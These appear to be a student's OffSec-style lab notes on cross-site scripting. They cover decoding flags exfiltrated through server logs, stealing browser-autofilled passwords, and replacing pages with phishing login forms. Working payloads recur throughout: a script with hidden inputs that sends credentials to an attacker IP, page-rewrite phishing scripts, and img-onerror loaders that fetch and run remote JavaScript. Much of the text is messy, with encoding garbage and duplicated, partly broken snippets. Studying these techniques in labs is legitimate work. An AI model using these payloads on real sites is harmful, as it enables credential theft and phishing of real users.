192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=3 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=7 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=4 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
f
}
```
flag_extractor.py
```python
import re

# The log data
log_data = """
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=O HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=S HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key={ HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=a HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=3 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=7 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=4 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=} HTTP/1.1" 404 -
"""

# Extract the hidden string
keys = re.findall(r'key=([A-Za-z0-9{}])', log_data)
hidden_string = ''.join(keys)

print(hidden_string)
```

![[Pasted image 20240805164357.png]]


------------------
#### 5.1.6 Stealing Saved Passwords
As security experts, we often recommend users use a password manager to store their passwords. However, some password managers will conveniently auto-fill any login prompt as soon as it's displayed on screen. We can take advantage of this to steal the credentials a user has stored in their password manager. In most situations, this can be done almost instantly and inconspicuously.

Not all password managers will auto-fill login prompts, but many of the built-in browser password managers will (like the ones found in Chrome). Typically, they search for the combination of a username (or email) input and an input that has theÂ _type_Â attribute set to "password". As attackers, we could create a similar form for a browser to auto-fill, which allows us to steal the credentials and exfiltrate them out.

While we could add the HTML input tags in the script payload, we'll keep everything in theÂ xss.jsÂ file instead to stay organized. In this file, we'll have to create a username and password input. Once the inputs are added to the page, the password manager would automatically fill them with the saved credentials. After some time, we'll send the value of the input back to our Kali machine.

```bASH
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:35]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss5.js

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:46]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss5.js 
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
    fetch("http://192.168.45.236:80/k?u=" + u.value + "&p=" + p.value)
}, 5000);
                 
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:49:27]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We'll first save the body of the document into aÂ _body_Â variable on line 1. On lines 3 and 8, we'll create two elements:Â _u_Â for username andÂ _p_Â for password. The username input element will have theÂ _type_Â attribute set to text (line 4) and the password input element will have the type attribute set toÂ _password_Â (line 9). As found on lines 5 and 10, the input fields will have a fixed position (so they don't interfere with the application). In the end, we'll set the opacity of the input fields (lines 6 and 11) to 0 so they aren't visible. However, we'll comment this out for now so that we can examine the input boxes in the victim's browser and then append them to the body once they're created. At this point, the browser should fill any saved credentials. To confirm, we'll set a timeout for 5 seconds on lines 16-18 at which point, a GET request will be made containing the value of the username and password.

Once the file is saved and the HTTP server is running, we'll instruct the sandbox to render the exploit with the "Used stored password" checkbox checked.

Payload
```bash
<script src="http://192.168.45.236:80/xss5.js"></script>
```
Insert the payload into the search field and git `search`
![[Pasted image 20240805170612.png]]
Hitting `search` translates the script to url encoding under the `s=` variable
![[Pasted image 20240805170704.png]]
Check the `python3 http.server 80` show that the credentials attempted to be grabbed, but we dont have credentials saved from the testing perspective
![[Pasted image 20240805170831.png]]
Now rendering from the victim side, 
![[Pasted image 20240805171112.png]]
the credentials pop up in the top left.
![[Pasted image 20240805171158.png]]
after 5 seconds the credentials get populated in the `python3 http.server`
![[Pasted image 20240805171224.png]]
##### Labs
![[Pasted image 20240805174038.png]]
Starting Page
![[Pasted image 20240805171452.png]]
Right click - Inspect - Edit HTML Change guest field to accept text
![[Pasted image 20240805172446.png]]
Submit the script into the guest field
![[Pasted image 20240805172835.png]]
Empty `Guest` means it worked
![[Pasted image 20240805172932.png]]
Check `python3 -m http.server 80` and see that the test worked 
![[Pasted image 20240805173742.png]]
Now render it on the victim side
![[Pasted image 20240805173918.png]]
Check `python3 server` for flags
`OS{ShavedHeadsFTW}`
![[Pasted image 20240805173955.png]]

------------------
#### 5.1.7 Phishing Users

Given that we have full access to the HTML document, we could also rewrite the entire page to be styled however we want and include whatever HTML elements we want. This means that we could force any page to resemble the login page, but when the user submits the credentials, the submission is sent to us instead of the intended server. The redirection of the credentials is done by replacing the location of the form posts to our Kali IP.

To make the page as convincing as possible, we would ideally use an existing login page, replicate it, and change theÂ _action_Â attribute of the form. The Search application in the XSS sandbox has a login page located onÂ `/login`.

![[Pasted image 20240805174257.png]]
While we could extract the HTML from this page and create a XSS payload to replace the content, we could also use JavaScript to get the HTML for us. That way, we don't have to handle massive amounts of HTML code in our JavaScript payload.

If we inspect the form in the Firefox developer tools, we find that the current form posts toÂ index.phpÂ (within theÂ loginÂ path).

![[Pasted image 20240805175327.png]]

In our script, we'll have to change the action attribute to our Kali IP. We'll also change the method to "get". This instructs the victim's browser to automatically add the payload to the URL query instead of the body, which makes it easier for us to find in our HTTP server logs.

xss6.js
```js
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.45.236"
	document.getElementsByTagName("form")[0].method = "get"
}))
```

We'll first useÂ _fetch_Â to grab the login page. Fetch responds with a JavaScriptÂ _promise_Â and we can access the response by using theÂ _then_Â method. By passing in anÂ [_arrow function_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions), we can get access to theÂ _text_Â function within the response object. TheÂ _text_Â function provides us access to the input stream (the HTML content of the login page, in this case). It also returns a promise. We can access the HTML content by passing another arrow function where the HTML content will be stored in a variable calledÂ _data_. To summarize, we make an HTTP GET request toÂ /login, extract the text from the response, and store the text into a variable calledÂ _data_.

Next, we can replace the entire HTML document of the page we are running the XSS payload on with the data from the login page. We do this by searching for the html element and replacing the innerHTML with the HTML of the login page. Finally, we query for the newly-created form and replace the action and method.

We'll save the contents of this toÂ xss.jsÂ and start the HTTP server. Next, we'll go back to the web root of the search application and type in our payload to exploit the injection vulnerability. Finally, we'll render the exploit page on the victim's browser. Before we clickÂ _Render_, we'll also check the "Blindly enter credentials" setting. This will simulate a gullible user that will log in when prompted.


Payload
```bash
<script src="http://192.168.45.236:80/xss6.js"></script>
```
In search field enter the script
![[Pasted image 20240805180401.png]]
Render with `Blindly entered credentials`
![[Pasted image 20240805180543.png]]
wait for credentials to finish being typed in and check `python3 -m http.server`

![[Pasted image 20240805180655.png]]

##### Labs


Starting page
![[Pasted image 20240805181008.png]]

Payload
```bash
<script src="http://192.168.45.236:80/xss6.js"></script>
```

InnerHTML Payload
```html
<img src="x" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.236:80/xss6.js\'></script>');" />
```

xss6.js
- this script is used for phishing - upon submitting the payload above into the `search` web page - it grabs the `xss6.js` script from the python server and provides a login page for the victim
```js
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.45.236"
	document.getElementsByTagName("form")[0].method = "get"
}))
```

![[Pasted image 20240805195021.png]]
hit `search` and the login screen appears - enter in `test/test` and hit sign in
![[Pasted image 20240805195158.png]]
upon hitting `sign in` we get the credentials in the  python server - this was an example

![[Pasted image 20240805195320.png]]
Now to for the lab
![[Pasted image 20240805195502.png]]
the problem is that we can't write a script here, only an image to bypass the `innerHTML`
![[Pasted image 20240805195634.png]]
The problem is that this website doesn't have a `login` form, so when we use the `innerHTML` payload that typically works

InnerHTML Payload
```html
<img src="x" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.236:80/xss6.js\'></script>');" />
```
we get an error of `NOT FOUND`
![[Pasted image 20240805200034.png]]
In order to get past this we need to create our own `login` form so we google `login form html` and come across this website https://www.w3schools.com/howto/howto_css_login_form.asp - the only parts that we need are the highlighted portions
![[Pasted image 20240805200405.png]]
###### login.html
- The only things changed were the `action_page.php` to `IP` and the method to `GET`
```html
<formÂ action="http://192.168.45.236/xss6.js"Â method="GET">  
Â Â <divÂ class="container">  
Â Â Â Â <labelÂ for="uname"><b>Username</b></label>  
Â Â Â Â <inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required>  
  
Â Â Â Â <labelÂ for="psw"><b>Password</b></label>  
Â Â Â Â <inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required>  
  
Â Â Â Â <buttonÂ type="submit">Login</button>  
  </div>
</form>
```
###### login.html (one liner)
- In HTML you want to put it on a one liner - it doesn't matter, so you do it bc the course said to.
- Now we have a full functioning HTML form that points to our kali machine
```html
#1 
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><buttonÂ type="submit">Login</button></div></form>"

#2
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action="http://192.168.45.236/cred"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><buttonÂ type="submit">Login</button></div></form>"

#offsec provided
document.getElementsByTagName("html")[0].innerHTML = "<form action='[http://192.168.45.156/cred](http://192.168.45.156/cred)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"
```
the goal of all of this is to change the `innerHTML` from the `xss6.js` script 
![[Pasted image 20240805201048.png]]
and make it point to `login.html (one liner)` and we have to do it with an `img` thanks to `innerHTMl` - we need to make a one liner `.js` that forces `innerHTML'
to utilize the new `login.html` form

###### phishingexercise.js
- chat gpt finished this becuase the whole script wasnt shown
```js
document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.236:80/login.html" method="POST">'
```

this `InnerHTML` Payload is the only thing that we can run `.js` in, so the goal is to somehow use this script to use the `login.html (one liner)` that is the tricky part
```html
<img src="x" onerror='fetch("http://192.168.45.236:80/xss6.js")'>
```
In order to solve this we need to create a `script` using `java script` with the `script element` - navigate to this website https://www.codingbeautydev.com/blog/javascript-create-script-element

On the website it shows `index.js` showing how to create a script element- we only need the highlighted lines
![[Pasted image 20240805202516.png]]
index.js
```js
const script = document.createElement('script');

// use local file
// script.src = 'script.js';

script.src =
  'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js';

script.async = true;

// make code in script to be treated as JavaScript module
// script.type = 'module';

script.onload = () => {
  console.log('Script loaded successfuly');
  const box = document.getElementById('box');
  box.textContent = 'The script has loaded.';
};

script.onerror = () => {
  console.log('Error occurred while loading script');
};

document.body.appendChild(script);
```

Full Payload
- the only thing changed from the google search is the `script.src` which is pointing to my kali machine and the `xss6.js` script which is the phishing script

Script Explanation:
- `img src` because `innerHTML`
- making a constant script with `const script` and creating an element named `script`
- the `script.src` is pointing to `xss6.js` which is the phishing java script created
- `script.async` is used to parse and evaluate as soon as possible
- `console.log` is for trouble shooting to see the log
- `document.body` just appends this to the body
```js
<img src="x" onerror='const script = document.createElement("script");script.src ="http://192.168.45.236/xss6.js";script.async = true;console.log("Script loaded successfully");document.body.appendChild(script);'>

<img src="x" onerror='const script = document.createElement("script");script.src ="http://192.168.45.236/phish.js";script.async = true;console.log("Script loaded successfully");document.body.appendChild(script);'>
```
Submit the new `FULL PAYLOAD` into the field
![[Pasted image 20240805203225.png]]
grab the `csv`
![[Pasted image 20240805203323.png]]




executing login.html with this script 


```js
<img src='x' onerror="const script = document.createElement('script'); script.src = '[http://192.168.45.236/phishingexercise.js](http://192.168.45.236/phishingexercise.js)'; script.async = true; document.body.appendChild(script);">
```

**From OFFSEC**
```js
document.getElementsByTagName("html")[0].innerHTML = "<form action='[http://192.168.45.156/cred](http://192.168.45.156/cred)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"



Since innerHTML was used, we can't use the <script> tag directly. However, we may create our own script element: [https://codingbeautydev.com/blog/javascript-create-script-element/](https://codingbeautydev.com/blog/javascript-create-script-element/)

const script = document.createElement('script'); script.src = '[http://192.168.45.156/phish.js](http://192.168.45.156/phish.js)'; script.async = true; document.body.appendChild(script);


<img src='x' onerror="const script = document.createElement('script'); script.src = '[http://192.168.45.156/phish.js](http://192.168.45.156/phish.js)'; script.async = true; document.body.appendChild(script);">
```

Comparing ours
phish.js
```js
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action='[http://192.168.45.236/login](http://192.168.45.236/login)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"
```
Final Payload
```js

<img src='x' onerror="const script = document.createElement('script'); script.src = '[http://192.168.45.156/phish.js](http://192.168.45.156/phish.js)'; script.async = true; document.body.appendChild(script);">

<img src='x' onerror="const script = document.createElement('script'); script.src = '[http://192.168.45.236/phish.js](http://192.168.45.236/phish.js)'; script.async = true; document.body.appendChild(script);">

<img src="x" onerror='const script = document.createElement("script");script.src ="http://192.168.45.236/phish.js";script.async = true;console.log("Script loaded successfully");document.body.appendChild(script);'>

```



### Full Working:
Create `phish.js`
```bash    
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action='[http://192.168.45.236/login](http://192.168.45.236/login)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"
```
Full payload in action before setting up `python3 server`
```js
#mine
<img src="x" onerror='const script = document.createElement("script");script.src ="http://192.168.45.236/phish.js";script.async = true;console.log("Script loaded successfully");document.body.appendChild(script);'>

#offsecs
<img src='x' onerror="const script = document.createElement('script'); script.src = '[http://192.168.45.236/phish.js](http://192.168.45.236/phish.js)'; script.async = true; document.body.appendChild(script);">
```
![[Pasted image 20240805213328.png]]
Hit `Share` to get working `URL-Encoding`
```URL
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0ieCIgb25lcnJvcj0nY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7c2NyaXB0LnNyYyA9Imh0dHA6Ly8xOTIuMTY4LjQ1LjIzNi9waGlzaC5qcyI7c2NyaXB0LmFzeW5jID0gdHJ1ZTtjb25zb2xlLmxvZygiU2NyaXB0IGxvYWRlZCBzdWNjZXNzZnVsbHkiKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7Jz4gLFNhbWFudGhhLDEK
```
![[Pasted image 20240805213438.png]]
Now that we have the working `csv` open up `python3 server` to make sure that its grabbing `phish.js`
![[Pasted image 20240805213600.png]]
the `url` is in and we can see that the login page created `phish.js` is working
![[Pasted image 20240805213641.png]]



### Fresh Redo

##### Phish.js (login form redirect - from offsec)

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Aug2024 18:55:21]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat phish.js   
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action='[http://192.168.45.236/login](http://192.168.45.236/login)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"
```
- The script `phish.js` is telling the html web page to point to `http://192.168.45.236/login` and present the login field below

â”Œâ”€â”€(rootðŸ’€gobots)-[06Aug2024 18:55:21]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat phish.js   
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action='[http://192.168.45.236/login](http://192.168.45.236/login)' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"

-----------------------

##### Login.html (One I created with following the video)
- Before putting on one liner - everything we need to make a proper login page
```html
<formÂ action="http://192.168.45.236/login"Â method="GET">  
Â Â <divÂ class="container">  
Â Â Â Â <labelÂ for="uname"><b>Username</b></label>  
Â Â Â Â <inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required>  
  
Â Â Â Â <labelÂ for="psw"><b>Password</b></label>  
Â Â Â Â <inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required>  
  
Â Â Â Â <buttonÂ type="submit">Login</button>  
Â Â </div>  
</form>
```
The One Liner
```html
<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><buttonÂ type="submit">Login</button></div></form>
```
Displaying it
<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><buttonÂ type="submit">Login</button></div></form>

-------------------
Now we need to make the one liner above = `innerHTML` in the `xss6.js` script instead of the `data`

![[Pasted image 20240805201048.png]]
So we take the `innerHTML` line from before and modify it to equal the new form
##### phishingexercise.js
- create the file `phishingexercise.js` in kali
```html
document.getElementsByTagName("html")[0].innerHTML = "<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><buttonÂ type="submit">Login</button></div></form>"
```
open up a `python3 -m http.server`
and utilize this `fetch` script to attempt to grab `phishingexercise.js`
```html
<img src="x" onerror='fetch("http://192.168.45.236:80/phishingexercise.js")'>
```
plug the script into the `list application`
![[Pasted image 20240806151812.png]]
hit share to get the `csv`
```csv
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0ieCIgb25lcnJvcj0nZmV0Y2goImh0dHA6Ly8xOTIuMTY4LjQ1LjIzNjo4MC9waGlzaGluZ2V4ZXJjaXNlLmpzIiknPiAsU2FtYW50aGEsMQo%3D
 ```
Upon submission, we get a hit on the python server
![[Pasted image 20240806155310.png]]
but nothing happens to the webpage
![[Pasted image 20240806155327.png]]
Upon googling, `fetch api` we find out that all fetch does is make a request and attempt to grab it, it does not execute the `.js` file
![[Pasted image 20240806155606.png]]
So now we need to find a way to create a script that grabs and runs the java script. This is done by utilizing java script to make a script element

https://www.codingbeautydev.com/blog/javascript-create-script-element on this webpage `index.js` shows us how to make a java script element that will do this

![[Pasted image 20240805202516.png]]
using `index.js` we can copy this to create the script with the `img` tag to run it with `innerHTML`

My `phishingexercise.js` payload
```js
<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/phishingexercise.js';script.async = true;document.body.appendChild(script);">
```

My `phish.js` payload
```js
<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/phish.js';script.async = true;document.body.appendChild(script);">
```

My `chatgptphish.js` payload
```js
